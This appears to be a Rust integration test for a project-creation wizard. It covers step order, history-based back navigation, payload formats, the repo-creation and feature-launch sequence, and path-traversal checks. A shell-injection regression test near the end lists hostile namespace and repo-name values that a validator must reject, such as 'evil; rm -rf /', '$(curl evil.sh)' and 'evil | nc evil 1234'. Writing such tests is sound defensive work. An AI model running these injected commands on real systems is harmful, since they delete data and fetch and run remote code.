//! Integration test for the "create a project from zero" wizard
//! orchestration. Pinned-down contract for AC-5 in
//! `artifacts/_context/implementation-spec.md`:
//!
//! 1. The wizard drives a **fixed seven-step** state machine in the
//!    locked order Name → Provider → Group → Machine → Agent → Model →
//!    Description. Every step transitions via `BootstrapState::advance_to`
//!    so the full chronology lands in `state.history`.
//! 2. The `Back` button must route through `state.history`
//!    (`BootstrapState::go_back`), **not** by subtracting 1 from a step
//!    index. The previous attempt's counter-based goBack silently
//!    re-entered auto-progressed screens.
//! 3. On a successful `Commit`, the Rust command returns
//!    `BootstrapOutcome::Launched { feature: LaunchedFeature }` whose
//!    payload is consumed by the React `useCreateProjectWizard` hook to
//!    navigate to the launched feature's `detail` view (the
//!    `create-project` post-launch view, **not** the legacy
//!    `create-from-zero` variant).
//!
//! The `submit_create_project_step` Tauri command takes
//! `State<'_, AppContext>` (a Tauri-internal wrapper whose constructor
//! is private), so it cannot be invoked directly from an external
//! integration test. The orchestration is therefore exercised at the
//! public type level:
//!
//! - The **state machine** is verified by driving `BootstrapState`
//!   through the seven advances + go-back chain.
//! - The **Commit payload** is built and validated against the same
//!   rules the Tauri command applies (slug + title + description).
//! - The **port contract** is exercised end-to-end via
//!   `CreateProjectAdapter` with stub `ProviderHttpPort` /
//!   `ProjectRepository` / `StepExecutor` implementations, asserting
//!   that the create-remote-repo → persist-project → dispatch-feature
//!   sequence completes with the expected `LaunchedFeature` shape.
//! - The **shell-injection regression** is pinned by `create_remote_repo_*`:
//!   the adapter must not accept a `namespace.id` containing shell
//!   metacharacters, and the `host` argument must reach the HTTP port
//!   verbatim (empty `host` ⇒ public default; non-empty `host` ⇒
//!   self-hosted enterprise).
//!
//! The React side (`src/hooks/useCreateProjectWizard.test.tsx`) covers
//! the view-emission contract end-to-end; together they pin AC-5.

use async_trait::async_trait;
use std::path::PathBuf;
use std::sync::Mutex;

use demeteo_lib::adapters::create_project_adapter::CreateProjectAdapter;
use demeteo_lib::commands::create_project::{BootstrapOutcome, CreateProjectStepPayload};
use demeteo_lib::domain::bootstrap::{BootstrapState, BootstrapStep, STEP_ORDER};
use demeteo_lib::domain::feature_origin::FeatureOrigin;
use demeteo_lib::domain::ids::{ProjectId, ProviderId, RepositoryId, WorkflowId};
use demeteo_lib::domain::models::GateDecision;
use demeteo_lib::domain::models::{
    Feature, Project, ProjectSettings, ProjectWorkflowOverride, Repository, StepExecution,
};
use demeteo_lib::error::AppError;
use demeteo_lib::ports::create_project_port::{CreateProjectPort, LaunchedFeature};
use demeteo_lib::ports::db::ProjectRepository;
use demeteo_lib::ports::provider_http::{
    CreateRepoRequest, CreatedRepo, NamespaceSummary, ProviderHttpPort, ProviderUserInfo,
    RepoSummary,
};
use demeteo_lib::ports::step_executor::{
    FeatureLaunch, GatePresenter, StepExecutor, SyncOutcomeView,
};

// ── Stub ports ─────────────────────────────────────────────────────────
//
// Minimal implementations of the ports the orchestration touches. They
// record calls in shared `Mutex<Vec<…>>` so the test can assert the
// call sequence without inspecting private state.

/// Captures `(host, kind, pat, request)` for every
/// `ProviderHttpPort::create_repo` invocation. The fields are stored
/// as `String` so the assertion code doesn't have to juggle lifetimes.
#[derive(Clone)]
struct CapturedCreate {
    host: String,
    kind: String,
    pat: String,
    request: CreateRepoRequest,
}

#[derive(Default)]
struct HttpCalls {
    create: Mutex<Vec<CapturedCreate>>,
}

struct StubProviderHttp {
    calls: std::sync::Arc<HttpCalls>,
}

#[async_trait]
impl ProviderHttpPort for StubProviderHttp {
    async fn validate_pat(
        &self,
        _host: &str,
        _kind: &str,
        _pat: &str,
    ) -> Result<ProviderUserInfo, AppError> {
        Ok(ProviderUserInfo {
            username: "u".into(),
            avatar_url: String::new(),
        })
    }

    async fn list_repos(
        &self,
        _host: &str,
        _kind: &str,
        _pat: &str,
    ) -> Result<Vec<RepoSummary>, AppError> {
        Ok(Vec::new())
    }

    async fn list_namespaces(
        &self,
        _host: &str,
        _kind: &str,
        _pat: &str,
    ) -> Result<Vec<NamespaceSummary>, AppError> {
        Ok(Vec::new())
    }

    async fn create_repo(
        &self,
        host: &str,
        kind: &str,
        pat: &str,
        req: &CreateRepoRequest,
    ) -> Result<CreatedRepo, AppError> {
        // Mirror the schema documented for the live
        // `ReqwestProviderHttpAdapter` so the test parses back into a
        // realistic shape.
        self.calls.create.lock().unwrap().push(CapturedCreate {
            host: host.to_string(),
            kind: kind.to_string(),
            pat: pat.to_string(),
            request: req.clone(),
        });
        let full_name = if req.namespace.kind == "org"
            || req.namespace.kind == "group"
            || req.namespace.kind == "personal"
        {
            format!("{}/{}", req.namespace.id, req.name)
        } else {
            req.name.clone()
        };
        Ok(CreatedRepo {
            full_name,
            default_branch: "main".to_string(),
            clone_url: format!("https://example/{}.git", req.name),
        })
    }
}

#[derive(Default)]
struct ProjectCalls {
    added: Mutex<Vec<Project>>,
    added_repositories: Mutex<Vec<Repository>>,
    saved_settings: Mutex<Vec<ProjectSettings>>,
    status_updates: Mutex<Vec<(ProjectId, String)>>,
}

struct StubProjects {
    calls: std::sync::Arc<ProjectCalls>,
}

impl ProjectRepository for StubProjects {
    fn get_projects(&self) -> Result<Vec<Project>, String> {
        Ok(Vec::new())
    }
    fn get_project(&self, _id: &ProjectId) -> Result<Option<Project>, String> {
        Ok(None)
    }
    fn add(&self, p: Project) -> Result<(), String> {
        self.calls.added.lock().unwrap().push(p);
        Ok(())
    }
    fn update(&self, _p: Project) -> Result<(), String> {
        Ok(())
    }
    fn update_status(&self, id: &ProjectId, status: &str) -> Result<(), String> {
        self.calls
            .status_updates
            .lock()
            .unwrap()
            .push((id.clone(), status.to_string()));
        Ok(())
    }
    fn delete(&self, _project_id: &ProjectId) -> Result<(), String> {
        Ok(())
    }
    fn delete_repositories_for(&self, _project_id: &ProjectId) -> Result<(), String> {
        Ok(())
    }
    fn add_repository(&self, r: Repository) -> Result<(), String> {
        self.calls.added_repositories.lock().unwrap().push(r);
        Ok(())
    }
    fn get_repositories_for(&self, _project_id: &ProjectId) -> Result<Vec<Repository>, String> {
        Ok(Vec::new())
    }
    fn get_settings(&self, _project_id: &ProjectId) -> Result<Option<ProjectSettings>, String> {
        Ok(None)
    }
    fn save_settings(&self, s: ProjectSettings) -> Result<(), String> {
        self.calls.saved_settings.lock().unwrap().push(s);
        Ok(())
    }
    fn list_workflow_overrides(
        &self,
        _project_id: &ProjectId,
    ) -> Result<Vec<ProjectWorkflowOverride>, String> {
        Ok(Vec::new())
    }
    fn list_overrides_for_workflow(
        &self,
        _project_id: &ProjectId,
        _workflow_id: &WorkflowId,
    ) -> Result<Vec<ProjectWorkflowOverride>, String> {
        Ok(Vec::new())
    }
    fn upsert_workflow_override(&self, _ov: ProjectWorkflowOverride) -> Result<(), String> {
        Ok(())
    }
}

#[derive(Default)]
struct ExecStartCalls {
    features_started: Mutex<Vec<StartedFeatureRecord>>,
}

type StartedFeatureRecord = (
    String,
    String,
    String,
    String,
    Option<String>,
    Option<String>,
);

struct StubExecutor {
    calls: std::sync::Arc<ExecStartCalls>,
}

#[async_trait]
impl StepExecutor for StubExecutor {
    async fn feature_start(&self, launch: FeatureLaunch) -> Result<Feature, String> {
        let FeatureLaunch {
            project_id,
            workflow_id,
            title,
            description,
            agent_kind,
            model,
            ..
        } = launch;
        self.calls.features_started.lock().unwrap().push((
            project_id.clone(),
            workflow_id.clone(),
            title.clone(),
            description,
            agent_kind.clone(),
            model.clone(),
        ));
        Ok(Feature {
            effort: None,
            id: demeteo_lib::domain::ids::FeatureId(format!("feat-{}", project_id)),
            project_id: ProjectId::from(project_id),
            workflow_id: Some(WorkflowId::from(workflow_id)),
            workflow_version_id: None,
            title,
            description: String::new(),
            status: "running".to_string(),
            created_at: 0,
            total_cost: 0.0,
            duration: "0s".to_string(),
            tokens: 0,
            agent_kind,
            model,
            mr_url: None,
            mr_state: Some("none".to_string()),
            pr_title: None,
            pr_body: None,
            commit_artifacts: None,
            loop_iterations: None,
            max_budget_usd: None,
            step_overrides: Vec::new(),
            attachments: Vec::new(),
            harness_baseline: None,
            origin: FeatureOrigin::DefaultBranch,
            diff_base_branch: None,
            resolved_branch: None,
        })
    }
    async fn feature_pause(&self, _feature_id: &str) -> Result<(), String> {
        Ok(())
    }
    async fn feature_resume(&self, _feature_id: &str) -> Result<(), String> {
        Ok(())
    }
    async fn feature_cancel(&self, _feature_id: &str) -> Result<(), String> {
        Ok(())
    }
    async fn step_get(&self, _execution_id: &str) -> Result<StepExecution, String> {
        Err("not used".into())
    }
    async fn step_retry(
        &self,
        _execution_id: &str,
        _new_model: Option<&str>,
        _new_agent: Option<&str>,
        _new_effort: Option<demeteo_lib::domain::models::EffortLevel>,
    ) -> Result<(), AppError> {
        Ok(())
    }
    async fn replay_from_step(
        &self,
        _execution_id: &str,
        _new_model: Option<&str>,
        _new_agent: Option<&str>,
        _new_effort: Option<demeteo_lib::domain::models::EffortLevel>,
    ) -> Result<(), String> {
        Ok(())
    }
    async fn step_list_for_run(&self, _feature_id: &str) -> Result<Vec<StepExecution>, String> {
        Ok(Vec::new())
    }
    async fn feature_sync(&self, _feature_id: &str) -> Result<SyncOutcomeView, String> {
        Ok(SyncOutcomeView::Ok {
            merge_commit_sha: Some("deadbeef".to_string()),
            changed: false,
        })
    }
    async fn feature_drift(
        &self,
        _feature_id: &str,
        _refresh: bool,
    ) -> Result<demeteo_core::domain::models::FeatureDrift, String> {
        Err("this stub counts nothing".into())
    }
    async fn feature_reconcile(
        &self,
        _feature_id: &str,
        _reconcile: demeteo_core::domain::upstream_feature::DivergenceReconcile,
    ) -> Result<Option<demeteo_core::ports::sync_session::SyncSessionView>, String> {
        Err("this stub reconciles nothing".into())
    }
    async fn feature_divergence(
        &self,
        _feature_id: &str,
    ) -> Result<Option<demeteo_core::domain::models::FeatureDivergence>, String> {
        Err("this stub measures nothing".into())
    }
    async fn feature_resolve_sync_conflicts(
        &self,
        _feature_id: &str,
        _conflict_files: &[String],
        _asked: &demeteo_core::domain::sync_resolver::SyncResolverChoice,
    ) -> Result<SyncOutcomeView, String> {
        Ok(SyncOutcomeView::Ok {
            merge_commit_sha: Some("deadbeef".to_string()),
            changed: false,
        })
    }
    async fn feature_sync_resolver(
        &self,
        _feature_id: &str,
    ) -> Result<demeteo_core::ports::step_executor::SyncResolverView, String> {
        Ok(demeteo_core::ports::step_executor::SyncResolverView {
            agent_kind: "opencode".into(),
            model: None,
            effort: demeteo_core::domain::models::EffortLevel::DEFAULT,
        })
    }
}

#[async_trait]
impl GatePresenter for StubExecutor {
    async fn gate_pending_for_run(
        &self,
        _feature_id: &str,
    ) -> Result<Option<GateDecision>, String> {
        Ok(None)
    }
    async fn gate_decide(
        &self,
        _step_execution_id: &str,
        _decision: &str,
        _feedback: Option<&str>,
    ) -> Result<(), AppError> {
        Ok(())
    }
}

fn make_adapter() -> (
    CreateProjectAdapter,
    std::sync::Arc<HttpCalls>,
    std::sync::Arc<ExecStartCalls>,
) {
    let http_calls = std::sync::Arc::new(HttpCalls::default());
    let http = std::sync::Arc::new(StubProviderHttp {
        calls: http_calls.clone(),
    });
    let adapter = CreateProjectAdapter::new(http);
    (
        adapter,
        http_calls,
        std::sync::Arc::new(ExecStartCalls::default()),
    )
}

// ── Helpers ────────────────────────────────────────────────────────────

fn make_state() -> BootstrapState {
    BootstrapState::new()
}

fn drive_forward_to(state: &mut BootstrapState, target: BootstrapStep) {
    while state.step != target {
        let next = state.step.next().expect("no next step");
        state.advance_to(next);
    }
}

// ── Tests ───────────────────────────────────────────────────────────────

#[test]
fn seven_step_order_is_locked() {
    // The wizard's STEP_ORDER is the canonical, compile-time-enforced
    // order. The React step components, the Rust `BootstrapStep` enum,
    // and the spec all share this contract.
    assert_eq!(STEP_ORDER.len(), 7);
    assert_eq!(
        STEP_ORDER,
        [
            BootstrapStep::Name,
            BootstrapStep::Provider,
            BootstrapStep::Group,
            BootstrapStep::Machine,
            BootstrapStep::Agent,
            BootstrapStep::Model,
            BootstrapStep::Description,
        ]
    );
}

#[test]
fn forward_happy_path_records_every_step_in_history() {
    let mut state = make_state();
    assert_eq!(state.step, BootstrapStep::Name);
    assert_eq!(state.history.len(), 1);

    for (i, target) in STEP_ORDER.iter().copied().enumerate() {
        drive_forward_to(&mut state, target);
        assert_eq!(state.step, target, "step #{i} mismatch");
        assert_eq!(state.history.len(), i + 1);
        assert_eq!(state.history[i], target);
    }

    assert!(state.is_final_step());
    assert_eq!(state.step_index(), 6);
    assert_eq!(state.history, STEP_ORDER.to_vec());
}

#[test]
fn back_routes_through_history_not_step_index() {
    // Simulate the auto-progressed chain:
    //   history: [Name, Provider(auto), Group(auto), Machine]
    // A counter-based goBack (subtract 1 from step_index) would jump
    // from Machine to Group, then Group to Provider, then Provider to
    // Name — losing the user's ability to rewind the auto-progressed
    // Provider and inspect it. The history-pop approach lets the
    // wizard frontend re-rewind past auto-progressed entries.
    let mut state = make_state();
    drive_forward_to(&mut state, BootstrapStep::Machine);
    assert_eq!(
        state.history,
        vec![
            BootstrapStep::Name,
            BootstrapStep::Provider,
            BootstrapStep::Group,
            BootstrapStep::Machine,
        ]
    );

    // First back: lands on Group (auto-progressed, still rewound).
    assert!(state.go_back());
    assert_eq!(state.step, BootstrapStep::Group);
    assert!(state.history.contains(&BootstrapStep::Group));

    // Second back: lands on Provider (auto-progressed).
    assert!(state.go_back());
    assert_eq!(state.step, BootstrapStep::Provider);

    // Third back: lands on Name (the user-visible step).
    assert!(state.go_back());
    assert_eq!(state.step, BootstrapStep::Name);
    assert_eq!(state.history, vec![BootstrapStep::Name]);
    assert!(!state.can_go_back());
}

#[test]
fn back_on_initial_step_is_no_op() {
    let mut state = make_state();
    assert!(!state.go_back());
    assert_eq!(state.step, BootstrapStep::Name);
    assert_eq!(state.history, vec![BootstrapStep::Name]);
}

#[test]
fn last_user_visible_step_returns_previous_history_entry() {
    // The wizard frontend uses `last_user_visible_step` to decide
    // whether to keep rewinding past an auto-progressed entry.
    let mut state = make_state();
    drive_forward_to(&mut state, BootstrapStep::Machine);
    assert_eq!(state.last_user_visible_step(), Some(BootstrapStep::Group));
}

#[test]
fn commit_payload_discriminant_matches_description_step() {
    // The wizard's payload.tag('step') must equal the state's current
    // step. The Rust command rejects mismatches as
    // `AppError::Validation` (see
    // `commands::create_project::submit_create_project_step`).
    let commit = CreateProjectStepPayload::Commit {
        title: Box::new("billing-service".into()),
        description: Box::new("Implement billing service.".into()),
        visibility: Box::new("private".into()),
        name: Box::new("billing-service".into()),
        provider_id: Box::new("prov-1".into()),
        provider_kind: Box::new("github".into()),
        provider_host: Box::new("github.com".into()),
        namespace_id: Box::new("octocat".into()),
        namespace_kind: Box::new("personal".into()),
        namespace_name: Box::new("octocat".into()),
        machine_kind: Box::new("local".into()),
        machine_id: Box::new(None),
        agent_kind: Box::new("opencode".into()),
        model: Box::new("anthropic/claude-sonnet-4".into()),
        effort: None,
    };
    assert_eq!(commit.expected_step(), BootstrapStep::Description);
}

#[test]
fn payload_deserialises_from_frontend_json() {
    // Wire-format contract with the TS wizard (`src/types.ts`): the
    // `CreateProjectStepPayload` union mirrors this enum's serde field
    // names exactly — snake_case multi-word fields (`provider_id`,
    // `namespace_id`, `machine_id`), matching the sibling nested IPC
    // struct `CreateProjectConfig`. A drift to camelCase on either side
    // resurfaces the `missing field 'provider_id'` IPC error on the
    // Provider step.
    let provider: CreateProjectStepPayload =
        serde_json::from_str(r#"{"step":"provider","provider_id":"prov-1","kind":"github"}"#)
            .expect("provider payload should deserialise");
    match provider {
        CreateProjectStepPayload::Provider { provider_id, kind } => {
            assert_eq!(provider_id, "prov-1");
            assert_eq!(kind, "github");
        }
        other => panic!("wrong variant: {other:?}"),
    }

    let group: CreateProjectStepPayload = serde_json::from_str(
        r#"{"step":"group","namespace_id":"octocat","kind":"personal","name":"octocat"}"#,
    )
    .expect("group payload should deserialise");
    assert_eq!(group.expected_step(), BootstrapStep::Group);

    let machine: CreateProjectStepPayload =
        serde_json::from_str(r#"{"step":"machine","kind":"local","machine_id":null}"#)
            .expect("machine payload should deserialise");
    assert_eq!(machine.expected_step(), BootstrapStep::Machine);
}

#[test]
fn commit_payload_validation_rejects_empty_name_title_description() {
    // The Command handler re-validates the slug at the Commit boundary
    // (the user could have walked forward, gone back, edited the name,
    // and walked forward again with a stale payload). We exercise the
    // adapter's `validate_name` here — the command also requires
    // non-empty title and description, which are pure string checks
    // the command body performs directly.
    let (adapter, _, _) = make_adapter();

    // Slug too short → AppError::Validation.
    let bad = adapter.validate_name("a");
    assert!(
        matches!(bad, Err(demeteo_lib::error::AppError::Validation { .. })),
        "single-char slug must be rejected: got {bad:?}"
    );

    // Slug with forbidden characters → AppError::Validation.
    let bad = adapter.validate_name("with space");
    assert!(
        matches!(bad, Err(demeteo_lib::error::AppError::Validation { .. })),
        "slug with space must be rejected: got {bad:?}"
    );

    // Uppercase → AppError::Validation.
    let bad = adapter.validate_name("UPPER");
    assert!(
        matches!(bad, Err(demeteo_lib::error::AppError::Validation { .. })),
        "uppercase slug must be rejected: got {bad:?}"
    );

    // A well-formed slug is accepted.
    let ok = adapter.validate_name("billing-service").unwrap();
    assert_eq!(ok.as_str(), "billing-service");
}

#[tokio::test]
async fn commit_payload_drives_port_sequence_and_returns_launched_outcome() {
    // Drive the same sequence the Tauri command's Commit arm runs:
    //   create_remote_repo → persist_project → dispatch_start_feature
    // Each stubbed port records the call so we can assert the
    // orchestration order + final `LaunchedFeature` shape.
    let http_calls = std::sync::Arc::new(HttpCalls::default());
    let project_calls = std::sync::Arc::new(ProjectCalls::default());
    let http = std::sync::Arc::new(StubProviderHttp {
        calls: http_calls.clone(),
    });
    let adapter = CreateProjectAdapter::new(http);

    let namespace = NamespaceSummary {
        id: "octocat".into(),
        name: "octocat".into(),
        kind: "personal".into(),
    };
    let created = adapter
        .create_remote_repo(
            "github",
            "github.com",
            "pat-stub",
            &namespace,
            "billing-service",
            "private",
        )
        .await
        .expect("create_remote_repo must succeed with stub HTTP port");
    assert_eq!(created.full_name, "octocat/billing-service");
    assert_eq!(created.default_branch, "main");

    // persist_project must add a `Project` row (status="bootstrapping")
    // + a `Repository` row, both with the freshly-created full_name.
    let project_id = ProjectId::from("p_test_orchestration".to_string());
    let repo_id = RepositoryId::from("p_test_orchestration_r0".to_string());
    let provider_id = ProviderId::from("prov-stub".to_string());
    let stub_projects = StubProjects {
        calls: project_calls.clone(),
    };
    let _project = adapter
        .persist_project(
            &stub_projects,
            project_id.clone(),
            "billing-service",
            "local",
            None,
            repo_id.clone(),
            provider_id,
            &created.full_name,
        )
        .await
        .expect("persist_project must succeed");

    // dispatch_start_feature must invoke the executor with the
    // wf-starter-standard workflow id + the wizard's typed title/description.
    let exec_start_calls = std::sync::Arc::new(ExecStartCalls::default());
    let exec_start_for_stub = exec_start_calls.clone();
    let stub_executor = StubExecutor {
        calls: exec_start_for_stub,
    };
    let mut launched = adapter
        .dispatch_start_feature(
            &stub_executor,
            &project_id,
            "billing-service",
            "Implement billing service.",
            Some("opencode"),
            Some("anthropic/claude-sonnet-4"),
        )
        .await
        .expect("dispatch_start_feature must succeed");
    // The command layer fills in `created_repo` from the previous step
    // before returning the `BootstrapOutcome::Launched`. Mirror that.
    launched.created_repo = created.clone();

    // Lock scopes are intentionally tight: each `lock()` is held only
    // long enough to copy out the data, then dropped before any
    // subsequent await point.
    {
        let added = project_calls.added.lock().unwrap();
        assert_eq!(added.len(), 1);
        assert_eq!(added[0].id, project_id);
        assert_eq!(added[0].status, "bootstrapping");
    }
    {
        let added_repos = project_calls.added_repositories.lock().unwrap();
        assert_eq!(added_repos.len(), 1);
        assert_eq!(added_repos[0].project_id, project_id);
        assert_eq!(added_repos[0].repo_path, "octocat/billing-service");
    }
    let started = exec_start_calls.features_started.lock().unwrap();
    assert_eq!(started.len(), 1, "executor.feature_start called once");
    let (pid, workflow_id, title, description, agent_kind, model) = &started[0];
    assert_eq!(pid, "p_test_orchestration");
    assert_eq!(
        workflow_id, "wf-starter-standard",
        "wizard must launch against the standard starter workflow"
    );
    assert_eq!(title, "billing-service");
    assert_eq!(description, "Implement billing service.");
    assert_eq!(agent_kind.as_deref(), Some("opencode"));
    assert_eq!(model.as_deref(), Some("anthropic/claude-sonnet-4"));
    drop(started);

    // The LaunchedFeature shape the React hook consumes (it uses
    // feature_id / feature_title / project_id / created_repo to drive
    // `viewForLaunchedFeature`).
    assert_eq!(launched.feature_title, "billing-service");
    assert_eq!(launched.project_id, "p_test_orchestration");
    assert_eq!(launched.created_repo.full_name, "octocat/billing-service");
    assert_eq!(launched.created_repo.default_branch, "main");
    assert!(launched.feature_id.starts_with("feat-"));
}

#[test]
fn launched_outcome_carries_fields_needed_by_create_project_view() {
    // (c) The AppView emitted by the wizard on completion is the
    // `create-project` post-launch view — a `detail` AppView carrying
    // `featureId` and `featureTitle`. The React hook's
    // `viewForLaunchedFeature` derives this from the
    // `LaunchedFeature` payload the Rust command returns. This test
    // pins the field shape so a future change to `BootstrapOutcome` or
    // `LaunchedFeature` cannot silently regress the React side.
    let launched = LaunchedFeature {
        feature_id: "feat-test".into(),
        feature_title: "billing-service".into(),
        project_id: "p_test".into(),
        created_repo: demeteo_lib::ports::provider_http::CreatedRepo {
            full_name: "octocat/billing-service".into(),
            default_branch: "main".into(),
            clone_url: "https://github.com/octocat/billing-service.git".into(),
        },
    };
    let outcome = BootstrapOutcome::Launched {
        feature: launched.clone(),
    };
    match outcome {
        BootstrapOutcome::Launched { feature } => {
            assert_eq!(feature.feature_id, "feat-test");
            assert_eq!(feature.feature_title, "billing-service");
            assert_eq!(feature.project_id, "p_test");
            // The wizard always carries the created repo's metadata
            // through so the post-launch UI can navigate to its
            // clone URL / MR target.
            assert_eq!(feature.created_repo.full_name, "octocat/billing-service");
            assert_eq!(feature.created_repo.default_branch, "main");
        }
        _ => panic!("BootstrapOutcome::Launched variant expected"),
    }
}

#[test]
fn launched_feature_serialises_as_expected_ipc_shape() {
    // `LaunchedFeature` is the IPC payload consumed by the React hook.
    // Its field names are snake_case (no `rename_all = "camelCase"`)
    // so the React side reads `feature_id`, `feature_title`, etc.
    let launched = LaunchedFeature {
        feature_id: "feat-x".into(),
        feature_title: "t".into(),
        project_id: "p".into(),
        created_repo: demeteo_lib::ports::provider_http::CreatedRepo {
            full_name: "octocat/repo".into(),
            default_branch: "main".into(),
            clone_url: "https://example/repo.git".into(),
        },
    };
    let json = serde_json::to_string(&launched).unwrap();
    assert!(json.contains("\"feature_id\":\"feat-x\""));
    assert!(json.contains("\"feature_title\":\"t\""));
    assert!(json.contains("\"project_id\":\"p\""));
    assert!(json.contains("\"full_name\":\"octocat/repo\""));
    assert!(json.contains("\"default_branch\":\"main\""));
    assert!(json.contains("\"clone_url\":\"https://example/repo.git\""));
}

#[test]
fn bootstrap_state_serialises_through_continue_outcome() {
    // The frontend matches on `outcome.kind === 'continue'` to decide
    // whether to stay in the wizard (continue → render the returned
    // state's current step) or navigate to the launched feature's
    // Detail view.
    let mut state = make_state();
    drive_forward_to(&mut state, BootstrapStep::Agent);
    // Initial history has 1 entry; advancing to the 5th step (Agent)
    // appends 4 more → 5 entries total.
    assert_eq!(state.history.len(), 5);
    let outcome = BootstrapOutcome::Continue {
        state: state.clone(),
    };
    match outcome {
        BootstrapOutcome::Continue { state: returned } => {
            assert_eq!(returned.step, BootstrapStep::Agent);
            assert_eq!(returned.history.len(), 5);
            assert_eq!(
                returned.history,
                vec![
                    BootstrapStep::Name,
                    BootstrapStep::Provider,
                    BootstrapStep::Group,
                    BootstrapStep::Machine,
                    BootstrapStep::Agent,
                ]
            );
        }
        _ => panic!("BootstrapOutcome::Continue variant expected"),
    }
}

#[test]
fn resolve_target_path_rejects_traversal() {
    // The adapter's `resolve_target_path` mirrors the wizard's commit
    // step's path derivation. Traversal segments must be rejected.
    let (adapter, _, _) = make_adapter();
    let ws = PathBuf::from("/tmp/demeteo-test");
    assert!(adapter.resolve_target_path(&ws, "..", "x").is_err());
    assert!(adapter.resolve_target_path(&ws, "ok", "../bad").is_err());
    assert!(adapter
        .resolve_target_path(&ws, "ok", "with/slash")
        .is_err());
    // A valid id + slug resolves to the documented workspace layout.
    let got = adapter.resolve_target_path(&ws, "p_1", "demo").unwrap();
    assert_eq!(got, ws.join("projects/p_1/repos/demo"));
}

#[test]
fn full_step_chain_drive_uses_seven_distinct_submits() {
    // Mirrors the wizard component's per-step submit handler: each
    // step in the chain emits a distinct `CreateProjectStepPayload`
    // discriminant. The Rust command matches the payload's
    // `expected_step` against the state's `step` and rejects
    // mismatches.
    let kinds = [
        CreateProjectStepPayload::Name { value: "x".into() },
        CreateProjectStepPayload::Provider {
            provider_id: "p".into(),
            kind: "github".into(),
        },
        CreateProjectStepPayload::Group {
            namespace_id: "n".into(),
            kind: "personal".into(),
            name: "n".into(),
        },
        CreateProjectStepPayload::Machine {
            kind: "local".into(),
            machine_id: None,
        },
        CreateProjectStepPayload::Agent {
            kind: "opencode".into(),
        },
        CreateProjectStepPayload::Model {
            model: "m".into(),
            effort: None,
        },
        CreateProjectStepPayload::Commit {
            title: Box::new("t".into()),
            description: Box::new("d".into()),
            visibility: Box::new("private".into()),
            name: Box::new("billing-service".into()),
            provider_id: Box::new("p".into()),
            provider_kind: Box::new("github".into()),
            provider_host: Box::new("github.com".into()),
            namespace_id: Box::new("octocat".into()),
            namespace_kind: Box::new("personal".into()),
            namespace_name: Box::new("octocat".into()),
            machine_kind: Box::new("local".into()),
            machine_id: Box::new(None),
            agent_kind: Box::new("opencode".into()),
            model: Box::new("anthropic/claude-sonnet-4".into()),
            effort: None,
        },
    ];
    let expected_steps = [
        BootstrapStep::Name,
        BootstrapStep::Provider,
        BootstrapStep::Group,
        BootstrapStep::Machine,
        BootstrapStep::Agent,
        BootstrapStep::Model,
        BootstrapStep::Description,
    ];
    for (i, payload) in kinds.iter().enumerate() {
        assert_eq!(
            payload.expected_step(),
            expected_steps[i],
            "payload #{i} discriminant mismatch"
        );
    }
    // Seven distinct discriminants.
    let tags: Vec<&'static str> = kinds
        .iter()
        .map(|p| match p {
            CreateProjectStepPayload::Name { .. } => "name",
            CreateProjectStepPayload::Provider { .. } => "provider",
            CreateProjectStepPayload::Group { .. } => "group",
            CreateProjectStepPayload::Machine { .. } => "machine",
            CreateProjectStepPayload::Agent { .. } => "agent",
            CreateProjectStepPayload::Model { .. } => "model",
            CreateProjectStepPayload::Commit { .. } => "commit",
        })
        .collect();
    assert_eq!(tags.len(), 7);
    let unique: std::collections::HashSet<&str> = tags.iter().copied().collect();
    assert_eq!(unique.len(), 7, "all 7 step discriminants must be distinct");
}

// ── Shell-injection + host-routing regression pins ─────────────────────
//
// The validator explicitly flagged the previous `gh` / `glab`
// shell-out at `adapters/create_project_adapter.rs:139` as a
// shell-injection RCE: `format!("{} {}", cmd, args.join(" "))`
// forwarded unsanitised `namespace.id` / `name` into a shell argv.
// The rewrite routes repo creation through
// `ProviderHttpPort::create_repo`. These tests pin the new contract:
//   1. `create_remote_repo` refuses to forward any shell metachar
//      in `namespace.id` / `name`.
//   2. The `host` argument reaches the HTTP port verbatim.
//   3. An empty `host` is preserved as the empty string (the
//      adapter's downstream `api_base()` resolves it to the public
//      default).
//   4. The `execution_port` is never consulted during the create step.

#[tokio::test]
async fn create_remote_repo_rejects_namespace_with_shell_metacharacters() {
    // Regression: a `namespace.id` such as `"; rm -rf /"` would
    // previously have been joined into `format!("{} {}", cmd, ...)`
    // and interpreted by the host shell — an RCE. The rewrite
    // forwards the value to a JSON body / URL where it has no
    // special meaning; the regression guard still rejects it as a
    // belt-and-braces measure so the wizard UI gets a clear
    // Validation error instead of a provider-side failure.
    let http_calls = std::sync::Arc::new(HttpCalls::default());
    let http = std::sync::Arc::new(StubProviderHttp {
        calls: http_calls.clone(),
    });
    let adapter = CreateProjectAdapter::new(http);

    for malicious in [
        "evil; rm -rf /",
        "evil && curl evil.sh",
        "$(curl evil.sh)",
        "`curl evil.sh`",
        "evil | nc evil 1234",
        "evil\nwget evil.sh",
        "evil > /etc/passwd",
    ] {
        let namespace = NamespaceSummary {
            id: malicious.into(),
            name: "demo".into(),
            kind: "personal".into(),
        };
        let err = adapter
            .create_remote_repo(
                "github",
                "github.com",
                "pat-stub",
                &namespace,
                "demo",
                "private",
            )
            .await
            .unwrap_err();
        assert!(
            matches!(err, AppError::Validation { .. }),
            "{malicious:?} must produce Validation, got {err:?}"
        );
    }
    // The HTTP port was never reached for any of the malicious
    // namespaces.
    let calls = http_calls.create.lock().unwrap();
    assert!(
        calls.is_empty(),
        "HTTP port must not be invoked with malicious namespace ids; got {} calls",
        calls.len()
    );
    drop(calls);
}

#[tokio::test]
async fn create_remote_repo_rejects_repo_name_with_shell_metacharacters() {
    // Belt-and-braces: validate_name already rejects the same chars
    // via `slug_matches`, but if `name` ever bypassed that path the
    // metachar guard still catches it.
    let http_calls = std::sync::Arc::new(HttpCalls::default());
    let http = std::sync::Arc::new(StubProviderHttp {
        calls: http_calls.clone(),
    });
    let adapter = CreateProjectAdapter::new(http);

    let namespace = NamespaceSummary {
        id: "octocat".into(),
        name: "doomed".into(),
        kind: "personal".into(),
    };
    let err = adapter
        .create_remote_repo(
            "github",
            "github.com",
            "pat-stub",
            &namespace,
            "evil; rm -rf /",
            "private",
        )
        .await
        .unwrap_err();
    assert!(matches!(err, AppError::Validation { .. }));
    let calls = http_calls.create.lock().unwrap();
    assert!(calls.is_empty());
    drop(calls);
}

#[tokio::test]
async fn create_remote_repo_with_empty_host_routes_to_public_default() {
    // Empty host ⇒ public provider default (the adapter's downstream
    // `api_base()` resolves `""` + `"github"` to
    // `https://api.github.com`).
    let http_calls = std::sync::Arc::new(HttpCalls::default());
